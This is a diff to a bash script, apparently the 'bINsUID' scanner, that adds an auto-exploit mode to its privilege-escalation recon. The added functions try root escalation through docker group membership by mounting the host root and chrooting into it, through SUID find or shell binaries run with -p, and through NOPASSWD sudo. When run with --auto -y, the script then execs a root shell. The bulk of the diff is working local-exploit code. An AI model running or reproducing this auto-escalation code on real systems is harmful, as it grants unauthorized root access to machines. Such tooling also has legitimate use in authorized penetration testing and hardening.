@@ -1,12 +1,15 @@
 #!/usr/bin/env bash
-# bINsUID bash scanner — focused privesc recon without Python.
-# Usage: binsuid-scan.sh [--quick] [--silent] [--no-color] [--debug]
-VERSION="1.1.8"
+# bINsUID bash scanner — privesc recon and auto-exploit without Python.
+# Usage: binsuid-scan.sh [--quick] [--auto] [-y] [--dry-run] [--silent] [--no-color] [--debug]
+VERSION="1.1.9"
 
 QUICK=0
 SILENT=0
 NO_COLOR=0
 DEBUG=0
+AUTO=0
+ASSUME_YES=0
+DRY_RUN=0
 
 for arg in "$@"; do
   case "$arg" in
@@ -14,7 +17,14 @@ for arg in "$@"; do
     --silent) SILENT=1 ;;
     --no-color) NO_COLOR=1 ;;
     --debug) DEBUG=1 ;;
+    --auto) AUTO=1 ;;
+    -y|--yes) ASSUME_YES=1 ;;
+    --dry-run) DRY_RUN=1; AUTO=1 ;;
     --scan-only|--version|-V|-h|--help) ;;
+    --json)
+      echo "[-] --json needs python3 (binsuid --json --scan-only)." >&2
+      exit 1
+      ;;
     --upgrade|-u)
       d="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
       if [ -f "$d/upgrade-binsuid.sh" ]; then
@@ -23,13 +33,15 @@ for arg in "$@"; do
       echo "[-] --upgrade needs upgrade-binsuid.sh on this host." >&2
       exit 1
       ;;
-    --auto|--json)
-      echo "[!] $arg ignored in bash mode (needs python3 for full binsuid)" >&2
-      ;;
     -V|--version) echo "binsuid-scan $VERSION (bash mode)"; exit 0 ;;
     -h|--help)
-      echo "binsuid-scan $VERSION — bash privesc recon (no Python)"
-      echo "  --quick  --silent  --no-color  --debug"
+      echo "binsuid-scan $VERSION — bash privesc recon + auto-exploit"
+      echo "  --quick  --auto  -y  --dry-run  --silent  --no-color  --debug"
+      echo ""
+      echo "Examples:"
+      echo "  binsuid-scan.sh --quick              # recon only"
+      echo "  binsuid-scan.sh --auto -y            # scan then auto-escalate"
+      echo "  binsuid-scan.sh --auto --dry-run -y  # show exploit commands"
       exit 0
       ;;
     *) echo "Unknown option: $arg" >&2; exit 2 ;;
@@ -241,6 +253,104 @@ count_lines() {
   echo "$1" | grep -c '.' || echo 0
 }
 
+member_of_group() {
+  local g="$1"
+  id -Gn 2>/dev/null | tr '[:upper:]' '[:lower:]' | grep -qw "$g"
+}
+
+try_docker_group() {
+  member_of_group docker || return 1
+  command -v docker >/dev/null 2>&1 || return 1
+  local cmd="docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+  local verify="docker run -v /:/mnt --rm alpine chroot /mnt sh -c 'id -u'"
+  p "${YELLOW}[*] Trying docker group escalation...${RESET}"
+  if [ "$DRY_RUN" -eq 1 ]; then
+    p "${GREEN}[+] Dry-run:${RESET} $verify"
+    p "    then: $cmd"
+    return 0
+  fi
+  local uid
+  uid="$(docker run -v /:/mnt --rm alpine chroot /mnt sh -c 'id -u' 2>/dev/null)" || return 1
+  [ "$uid" = "0" ] || return 1
+  p "${GREEN}[+] SUCCESS — root via docker group (host at /mnt in container)${RESET}"
+  if [ "$ASSUME_YES" -eq 1 ] && [ -t 0 ] && [ -t 1 ]; then
+    p "${CYAN}[*] Launching root shell (exit to return)...${RESET}"
+    exec $cmd
+  fi
+  p "${CYAN}[*] Run manually:${RESET} $cmd"
+  return 0
+}
+
+try_suid_binary() {
+  local bin="$1" name="${bin##*/}" cmd="" out=""
+  [ -x "$bin" ] || return 1
+  case "$name" in
+    find)
+      cmd="cd / && $bin . -exec /bin/sh -p \\; -quit"
+      p "${YELLOW}[*] Trying SUID $bin ...${RESET}"
+      if [ "$DRY_RUN" -eq 1 ]; then
+        p "${GREEN}[+] Dry-run:${RESET} $cmd"
+        return 0
+      fi
+      (cd / && "$bin" . -exec /bin/sh -p -c 'id -u' \; -quit 2>/dev/null) | grep -q '^0$' || return 1
+      ;;
+    bash|sh|dash|ash|zsh|ksh)
+      cmd="$bin -p"
+      p "${YELLOW}[*] Trying SUID $bin ...${RESET}"
+      if [ "$DRY_RUN" -eq 1 ]; then
+        p "${GREEN}[+] Dry-run:${RESET} $cmd"
+        return 0
+      fi
+      out="$("$bin" -p -c 'id -u' 2>/dev/null)" || return 1
+      [ "$out" = "0" ] || return 1
+      ;;
+    *)
+      return 1
+      ;;
+  esac
+  p "${GREEN}[+] SUCCESS — SUID $name${RESET}"
+  if [ "$ASSUME_YES" -eq 1 ] && [ -t 0 ] && [ -t 1 ]; then
+    p "${CYAN}[*] Launching root shell (exit to return)...${RESET}"
+    eval "exec $cmd"
+  fi
+  p "${CYAN}[*] Run:${RESET} $cmd"
+  return 0
+}
+
+try_sudo_nopasswd() {
+  [ -n "$SUDO_OUT" ] || return 1
+  echo "$SUDO_OUT" | grep -qiE 'NOPASSWD.*\bALL\b' || return 1
+  local cmd="sudo -n /bin/sh"
+  p "${YELLOW}[*] Trying NOPASSWD sudo ALL...${RESET}"
+  if [ "$DRY_RUN" -eq 1 ]; then
+    p "${GREEN}[+] Dry-run:${RESET} $cmd"
+    return 0
+  fi
+  sudo -n /bin/sh -c 'id -u' 2>/dev/null | grep -q '^0$' || return 1
+  p "${GREEN}[+] SUCCESS — NOPASSWD sudo${RESET}"
+  [ "$ASSUME_YES" -eq 1 ] && [ -t 0 ] && [ -t 1 ] && exec $cmd
+  p "${CYAN}[*] Run:${RESET} $cmd"
+  return 0
+}
+
+auto_escalate() {
+  p ""
+  p "${CYAN}${BOLD}>>> Auto-exploit${RESET}"
+  try_docker_group && return 0
+  if [ -n "$SUID_PRIORITY" ]; then
+    local bin old_ifs
+    old_ifs="$IFS"
+    IFS=$'\n'
+    for bin in $SUID_PRIORITY; do
+      [ -n "$bin" ] && try_suid_binary "$bin" && { IFS="$old_ifs"; return 0; }
+    done
+    IFS="$old_ifs"
+  fi
+  try_sudo_nopasswd && return 0
+  p "${RED}[-] No automatic escalation succeeded.${RESET}"
+  return 1
+}
+
 # --- run scans ---
 scan_suid
 scan_sgid
@@ -263,7 +373,11 @@ fi
 p "${CYAN}==============================================${RESET}"
 p "${BOLD}  bINsUID scan (bash ${CYAN}$VERSION${RESET}${BOLD})${RESET}"
 p "${CYAN}==============================================${RESET}"
-p "${DIM}  Recon only — no Python on this host.${RESET}"
+if [ "$AUTO" -eq 1 ]; then
+  p "${DIM}  Auto-exploit mode — tries best vector after scan.${RESET}"
+else
+  p "${DIM}  Recon only — add --auto -y to escalate.${RESET}"
+fi
 p ""
 
 if [ -n "$SUID_PRIORITY" ]; then
@@ -340,6 +454,11 @@ if [ "$PRIORITY_COUNT" -eq 0 ]; then
   p "  ${DIM}find / -perm -4000 -type f 2>/dev/null | grep -vE 'passwd|mount|su\$|...'${RESET}"
   p "  ${DIM}find /home /var /opt -writable -type f 2>/dev/null | head -20${RESET}"
   p "  ${DIM}getcap -r / 2>/dev/null${RESET}"
+fi
+
+if [ "$AUTO" -eq 1 ]; then
+  auto_escalate
+  exit $?
 fi
 
 [ "$PRIORITY_COUNT" -gt 0 ] && exit 1 || exit 0
